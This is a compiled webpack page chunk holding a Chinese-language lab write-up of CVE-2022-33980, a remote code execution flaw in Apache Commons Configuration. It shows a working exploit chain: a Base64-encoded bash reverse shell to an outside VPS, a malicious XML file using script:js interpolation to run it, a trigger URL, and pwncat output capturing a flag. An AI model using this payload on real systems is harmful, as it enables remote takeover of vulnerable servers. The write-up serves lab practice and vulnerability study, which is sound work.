"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[4620],{22016:(n,e,t)=>{t.r(e),t.d(e,{assets:()=>o,contentTitle:()=>a,default:()=>p,frontMatter:()=>s,metadata:()=>i,toc:()=>l});const i=JSON.parse('{"id":"Independent-Environment/CVE/CVE-2022-33980/index","title":"CVE-2022-33980","description":"Tags","source":"@site/docs/Independent-Environment/CVE/CVE-2022-33980/index.md","sourceDirName":"Independent-Environment/CVE/CVE-2022-33980","slug":"/Independent-Environment/CVE/CVE-2022-33980/","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CVE/CVE-2022-33980/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Independent-Environment/CVE/CVE-2022-33980/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"Independent_Environment_Sidebar","previous":{"title":"CVE-2022-24223","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CVE/CVE-2022-24223/"},"next":{"title":"CVE-2023-1773","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CVE/CVE-2023-1773/"}}');var r=t(74848),c=t(28453);const s={},a="CVE-2022-33980",o={},l=[];function d(n){const e={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",header:"header",li:"li",p:"p",pre:"pre",ul:"ul",...(0,c.R)(),...n.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(e.header,{children:(0,r.jsx)(e.h1,{id:"cve-2022-33980",children:"CVE-2022-33980"})}),"\n",(0,r.jsxs)(e.admonition,{type:"info",children:[(0,r.jsx)(e.p,{children:"Tags"}),(0,r.jsxs)(e.ul,{children:["\n",(0,r.jsx)(e.li,{children:"Apache Commons Configuration \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"}),"\n"]}),(0,r.jsx)(e.p,{children:"\u5b98\u65b9\u6570\u636e\u5e93\u8bb0\u5f55"}),(0,r.jsxs)(e.blockquote,{children:["\n",(0,r.jsx)(e.p,{children:"Apache Commons Configuration \u6267\u884c\u53d8\u91cf\u63d2\u503c\uff0c\u5141\u8bb8\u52a8\u6001\u8bc4\u4f30\u548c\u6269\u5c55\u5c5e\u6027\u3002"}),"\n",(0,r.jsxs)(e.p,{children:["\u63d2\u503c\u7684\u6807\u51c6\u683c\u5f0f\u662f \u201c${prefix",":name","}\u201d\uff0c\u5176\u4e2d \u201cprefix\u201d \u7528\u4e8e\u5b9a\u4f4d\u6267\u884c\u63d2\u503c\u7684 org.apache.commons.configuration2.interpol.Lookup \u5b9e\u4f8b\u3002"]}),"\n",(0,r.jsx)(e.p,{children:"\u4ece\u7248\u672c 2.4 \u5f00\u59cb\u4e00\u76f4\u5230 2.7\uff0c\u9ed8\u8ba4 Lookup \u5b9e\u4f8b\u96c6\u5305\u542b\u53ef\u80fd\u5bfc\u81f4\u4efb\u610f\u4ee3\u7801\u6267\u884c\u6216\u4e0e\u8fdc\u7a0b\u670d\u52a1\u5668\u8054\u7cfb\u7684\u63d2\u503c\u5668\u3002"}),"\n",(0,r.jsx)(e.p,{children:"\u8fd9\u4e9b\u67e5\u627e\u662f\uff1a"}),"\n",(0,r.jsxs)(e.ul,{children:["\n",(0,r.jsx)(e.li,{children:"\u201cscript\u201d - \u4f7f\u7528 JVM \u811a\u672c\u6267\u884c\u5f15\u64ce (javax.script) \u6267\u884c\u8868\u8fbe\u5f0f"}),"\n",(0,r.jsx)(e.li,{children:"\u201cdns\u201d - \u89e3\u6790 dns \u8bb0\u5f55"}),"\n",(0,r.jsx)(e.li,{children:"\u201curl\u201d - \u4ece url \u52a0\u8f7d\u503c\uff0c\u5305\u62ec\u4ece\u8fdc\u7a0b\u670d\u52a1\u5668"}),"\n"]}),"\n",(0,r.jsx)(e.p,{children:"\u4f7f\u7528\u63d2\u503c\u9ed8\u8ba4\u503c\u7684\u5e94\u7528\u7a0b\u5e8f\u5982\u679c\u4f7f\u7528\u4e0d\u53d7\u4fe1\u4efb\u7684\u914d\u7f6e\u503c\uff0c\u53d7\u5f71\u54cd\u7684\u7248\u672c\u53ef\u80fd\u5bb9\u6613\u53d7\u5230\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6216\u65e0\u610f\u4e2d\u4e0e\u8fdc\u7a0b\u670d\u52a1\u5668\u7684\u8054\u7cfb\u3002"}),"\n",(0,r.jsx)(e.p,{children:"\u5efa\u8bae\u7528\u6237\u5347\u7ea7\u5230 Apache Commons Configuration 2.8.0\uff0c\u8be5\u7248\u672c\u9ed8\u8ba4\u7981\u7528\u6709\u95ee\u9898\u7684\u63d2\u503c\u5668\u3002"}),"\n"]})]}),"\n",(0,r.jsxs)(e.p,{children:["\u53c2\u8003 ",(0,r.jsx)(e.a,{href:"https://www.supersmallblack.cn/CVE%E5%A4%8D%E7%8E%B0.html",children:"\u4e00\u4e9b cve \u7684\u590d\u73b0 - \u5c0f\u9ed1\u7684\u7b14\u8bb0"})]}),"\n",(0,r.jsx)(e.p,{children:"\u539f\u59cb\u7684\u6076\u610f\u6307\u4ee4\u4e3a"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-plaintext",children:"/bin/sh -i >& /dev/tcp/139.*.*.*/9999 0>&1\n"})}),"\n",(0,r.jsx)(e.p,{children:"\u7ecf\u8fc7 Base64 \u7f16\u7801\u540e\u5f97\u5230"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-plaintext",children:"L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMzkuOS40LjU2Lzk5OTkgMD4mMQ==\n"})}),"\n",(0,r.jsx)(e.p,{children:"\u5728 vps \u4e0a\u6784\u9020\u6076\u610f xml"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-xml",children:'<?xml version="1.0" encoding="ISO-8859-1" ?>\n<configuration>\n        <path>${script:js:java.lang.Runtime.getRuntime().exec("bash -c {echo,L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMzkuOS40LjU2Lzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}")}</path>\n</configuration>\n'})}),"\n",(0,r.jsx)(e.p,{children:"\u542f\u52a8\u4e34\u65f6 http \u670d\u52a1\u5668"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-plaintext",children:"root@jmt-projekt:~# python3 -m http.server 8080\nServing HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...\n"})}),"\n",(0,r.jsx)(e.p,{children:"\u7136\u540e\u8bbf\u95ee\u670d\u52a1"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-plaintext",children:"http://eci-2ze440yv0x20kqyxglfa.cloudeci1.ichunqiu.com/Url?url=http://139.*.*.*:8080/CVE-2022-33980.xml&data=path\n"})}),"\n",(0,r.jsx)(e.p,{children:"\u5373\u53ef\u6536\u5230\u53cd\u8fde\u7684 shell"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-bash",children:"root@jmt-projekt:~# pwncat-cs -lp 9999\n[17:18:30] Welcome to pwncat \ud83d\udc08!\n[17:21:09] received connection from 39.106.20.178:29507\n[17:21:10] 0.0.0.0:9999: upgrading from /bin/dash to /bin/bash\n[17:21:11] 39.106.20.178:29507: registered new host w/ db\n(local) pwncat$ back\n(remote) root@engine-2:/opt/app# cat /flag\nflag{296b02e5-4fda-4031-a89f-ce813b77af1b}\n"})})]})}function p(n={}){const{wrapper:e}={...(0,c.R)(),...n.components};return e?(0,r.jsx)(e,{...n,children:(0,r.jsx)(d,{...n})}):d(n)}},28453:(n,e,t)=>{t.d(e,{R:()=>s,x:()=>a});var i=t(96540);const r={},c=i.createContext(r);function s(n){const e=i.useContext(c);return i.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function a(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(r):n.components||r:s(n.components),i.createElement(c.Provider,{value:e},n.children)}}}]);